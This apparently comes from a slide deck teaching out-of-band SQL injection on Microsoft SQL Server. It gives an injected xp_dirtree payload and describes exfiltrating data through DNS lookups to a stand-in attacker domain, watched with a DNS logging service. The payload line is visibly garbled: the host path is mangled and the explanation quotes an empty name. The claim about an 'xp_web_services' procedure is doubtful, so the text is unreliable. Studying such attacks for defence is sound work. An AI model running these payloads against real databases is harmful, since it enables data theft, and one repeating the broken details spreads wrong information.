OOB in Action

OOB SQLi: Microsoft SQL Server Example

Leveraging extended procedures for external communication.

Key Extended Procedures

  • •xp_dirtree: Lists directory contents, can trigger DNS lookups.
  • •xp_web_services: Can be used to make HTTP requests.
  • •These procedures, if enabled and with sufficient privileges, allow outbound network activity.
Key Takeaway

MSSQL's extended procedures like xp_dirtree are prime targets for OOB SQLi, enabling covert communication channels.

Payload Example: DNS Exfiltration

Injected Payload:
'; EXEC master..xp_dirtree '\ est';--

Explanation:
- The SQL Server attempts to resolve ''.
- Attacker monitors DNS logs for incoming requests.
- Data can be encoded in subdomains (e.g., 'data.exfil.attacker_domain').
Monitoring DNS

Tools like `dnslog.cn` or a custom DNS server can be used to monitor and capture these OOB DNS requests.

Permission Check

Ensure the database user has sufficient privileges to execute extended stored procedures. This is a common blocker.
